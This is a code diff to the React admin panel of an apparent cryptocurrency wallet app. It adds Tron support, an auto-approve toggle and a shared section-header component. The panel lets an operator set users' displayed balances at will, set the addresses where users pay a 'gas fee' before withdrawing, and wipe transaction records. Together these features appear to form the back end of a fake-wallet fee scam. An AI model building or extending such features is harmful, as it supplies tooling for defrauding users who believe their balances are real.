@@ -1,5 +1,5 @@
 import React, { useEffect, useState } from 'react';
-import { LogOut, Save, Trash2 } from 'lucide-react';
+import { LogOut, Save, Trash2, Zap } from 'lucide-react';
 import { api, WalletData, SettingsData } from '../api';
 import { toast } from 'sonner';
 import { markTxWiped } from '../txStorage';
@@ -16,27 +16,30 @@ export function AdminView({ onLogout }: AdminViewProps) {
   const [wiping, setWiping] = useState(false);
   const [confirmWipe, setConfirmWipe] = useState(false);
 
-  // Editable fields
-  const [bal, setBal] = useState({ btc: '', eth: '', usdt: '' });
+  const [bal, setBal] = useState({ btc: '', eth: '', usdt: '', trx: '' });
   const [fees, setFees] = useState({ gas_fee_usd: '', gas_fee_btc: '' });
   const [addresses, setAddresses] = useState({
     deposit_address_btc: '',
     deposit_address_eth: '',
     deposit_address_usdt: '',
+    deposit_address_trx: '',
   });
+  const [autoApprove, setAutoApprove] = useState(false);
 
   useEffect(() => {
     Promise.all([api.getWallet(), api.getSettings()])
       .then(([w, s]) => {
         setWallet(w);
         setSettings(s);
-        setBal({ btc: w.btc.toString(), eth: w.eth.toString(), usdt: w.usdt.toString() });
+        setBal({ btc: w.btc.toString(), eth: w.eth.toString(), usdt: w.usdt.toString(), trx: w.trx.toString() });
         setFees({ gas_fee_usd: s.gas_fee_usd.toString(), gas_fee_btc: s.gas_fee_btc.toString() });
         setAddresses({
           deposit_address_btc: s.deposit_address_btc ?? '',
           deposit_address_eth: s.deposit_address_eth ?? '',
           deposit_address_usdt: s.deposit_address_usdt ?? '',
+          deposit_address_trx: s.deposit_address_trx ?? '',
         });
+        setAutoApprove(s.auto_approve ?? false);
       })
       .catch(() => toast.error('Failed to load admin data'))
       .finally(() => setLoading(false));
@@ -50,6 +53,7 @@ export function AdminView({ onLogout }: AdminViewProps) {
           btc: parseFloat(bal.btc) || 0,
           eth: parseFloat(bal.eth) || 0,
           usdt: parseFloat(bal.usdt) || 0,
+          trx: parseFloat(bal.trx) || 0,
         }),
         api.updateSettings({
           gas_fee_usd: parseFloat(fees.gas_fee_usd) || 0,
@@ -57,6 +61,8 @@ export function AdminView({ onLogout }: AdminViewProps) {
           deposit_address_btc: addresses.deposit_address_btc.trim() || null,
           deposit_address_eth: addresses.deposit_address_eth.trim() || null,
           deposit_address_usdt: addresses.deposit_address_usdt.trim() || null,
+          deposit_address_trx: addresses.deposit_address_trx.trim() || null,
+          auto_approve: autoApprove,
         }),
       ]);
       setWallet(updatedWallet);
@@ -95,20 +101,19 @@ export function AdminView({ onLogout }: AdminViewProps) {
     <div className="flex flex-col h-full bg-background pb-6 overflow-y-auto">
       <div className="flex flex-col p-6 pt-10">
         <h1 className="text-2xl font-semibold text-foreground mb-1">Admin Panel</h1>
-        <p className="text-muted text-sm">Manage wallet balances, settings and deposit addresses</p>
+        <p className="text-muted text-sm">Manage balances, deposit addresses and settings</p>
       </div>
 
       <div className="flex-1 px-6 flex flex-col gap-5">
 
-        {/* ── Balances ───────────────────────────────────── */}
-        <div className="flex flex-col gap-1 mb-1">
-          <span className="text-xs text-primary font-semibold uppercase tracking-widest">Balances</span>
-        </div>
+        {/* ── Balances ───────────────────────────────── */}
+        <SectionHeader label="Balances" />
 
         {([
           { label: 'Bitcoin (BTC)', key: 'btc', current: wallet.btc },
           { label: 'Ethereum (ETH)', key: 'eth', current: wallet.eth },
           { label: 'Tether (USDT)', key: 'usdt', current: wallet.usdt },
+          { label: 'Tron (TRX)', key: 'trx', current: wallet.trx },
         ] as const).map(({ label, key, current }) => (
           <div key={key} className="flex flex-col gap-2">
             <label className="text-sm text-foreground font-medium flex items-center justify-between">
@@ -125,16 +130,15 @@ export function AdminView({ onLogout }: AdminViewProps) {
           </div>
         ))}
 
-        {/* ── Deposit Addresses ──────────────────────────── */}
-        <div className="flex flex-col gap-1 mt-3 mb-1">
-          <span className="text-xs text-primary font-semibold uppercase tracking-widest">Deposit Addresses</span>
-        </div>
-        <p className="text-xs text-muted -mt-3">Shown to users when they tap "Receive"</p>
+        {/* ── Deposit Addresses ──────────────────────── */}
+        <SectionHeader label="Deposit Addresses" className="mt-3" />
+        <p className="text-xs text-muted -mt-3">Shown to users on the Receive screen and as the gas fee payment destination</p>
 
         {([
           { label: 'BTC Deposit Address', key: 'deposit_address_btc', placeholder: 'bc1q…' },
           { label: 'ETH Deposit Address', key: 'deposit_address_eth', placeholder: '0x…' },
           { label: 'USDT Deposit Address', key: 'deposit_address_usdt', placeholder: '0x… or T…' },
+          { label: 'TRX Deposit Address', key: 'deposit_address_trx', placeholder: 'T…' },
         ] as const).map(({ label, key, placeholder }) => (
           <div key={key} className="flex flex-col gap-2">
             <label className="text-sm text-foreground font-medium">{label}</label>
@@ -148,10 +152,8 @@ export function AdminView({ onLogout }: AdminViewProps) {
           </div>
         ))}
 
-        {/* ── Gas Fee ────────────────────────────────────── */}
-        <div className="flex flex-col gap-1 mt-3 mb-1">
-          <span className="text-xs text-primary font-semibold uppercase tracking-widest">Network Gas Fee</span>
-        </div>
+        {/* ── Network Gas Fee ────────────────────────── */}
+        <SectionHeader label="Network Gas Fee" className="mt-3" />
 
         <div className="flex flex-col gap-2">
           <label className="text-sm text-foreground font-medium flex items-center justify-between">
@@ -165,8 +167,7 @@ export function AdminView({ onLogout }: AdminViewProps) {
               value={fees.gas_fee_usd}
               onChange={(e) => setFees(prev => ({ ...prev, gas_fee_usd: e.target.value }))}
               className="w-full bg-card border border-border rounded-xl pl-8 pr-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors"
-              step="any"
-              min="0"
+              step="any" min="0"
             />
           </div>
         </div>
@@ -181,10 +182,39 @@ export function AdminView({ onLogout }: AdminViewProps) {
             value={fees.gas_fee_btc}
             onChange={(e) => setFees(prev => ({ ...prev, gas_fee_btc: e.target.value }))}
             className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors"
-            step="any"
-            min="0"
+            step="any" min="0"
           />
         </div>
+
+        {/* ── Auto-Approve ───────────────────────────── */}
+        <SectionHeader label="Transaction Mode" className="mt-3" />
+
+        <button
+          onClick={() => setAutoApprove(v => !v)}
+          className={`w-full flex items-center justify-between px-4 py-4 rounded-xl border transition-colors ${
+            autoApprove
+              ? 'border-primary/40 bg-primary/10'
+              : 'border-border bg-card'
+          }`}
+        >
+          <div className="flex items-center gap-3">
+            <Zap className={`w-5 h-5 ${autoApprove ? 'text-primary' : 'text-muted'}`} />
+            <div className="text-left">
+              <div className={`text-sm font-medium ${autoApprove ? 'text-primary' : 'text-foreground'}`}>
+                Auto-Approve Withdrawals
+              </div>
+              <div className="text-xs text-muted mt-0.5">
+                {autoApprove
+                  ? 'Gas fee step is skipped — withdrawals process immediately'
+                  : 'Users must confirm gas fee payment before withdrawing'}
+              </div>
+            </div>
+          </div>
+          {/* Toggle switch */}
+          <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 ${autoApprove ? 'bg-primary' : 'bg-border'}`}>
+            <div className={`absolute top-0.5 w-5 h-5 bg-white rounded-full shadow transition-transform ${autoApprove ? 'translate-x-5' : 'translate-x-0.5'}`} />
+          </div>
+        </button>
 
         <button
           onClick={handleSave}
@@ -195,10 +225,8 @@ export function AdminView({ onLogout }: AdminViewProps) {
           {saving ? 'Saving…' : 'Save Changes'}
         </button>
 
-        {/* ── Danger Zone ────────────────────────────────── */}
-        <div className="flex flex-col gap-1 mt-3 mb-1">
-          <span className="text-xs text-destructive font-semibold uppercase tracking-widest">Danger Zone</span>
-        </div>
+        {/* ── Danger Zone ────────────────────────────── */}
+        <SectionHeader label="Danger Zone" className="mt-3" danger />
 
         {!confirmWipe ? (
           <button
@@ -242,6 +270,16 @@ export function AdminView({ onLogout }: AdminViewProps) {
           <span className="font-medium">Logout Admin</span>
         </button>
       </div>
+    </div>
+  );
+}
+
+function SectionHeader({ label, className = '', danger = false }: { label: string; className?: string; danger?: boolean }) {
+  return (
+    <div className={`flex flex-col gap-1 mb-1 ${className}`}>
+      <span className={`text-xs font-semibold uppercase tracking-widest ${danger ? 'text-destructive' : 'text-primary'}`}>
+        {label}
+      </span>
     </div>
   );
 }
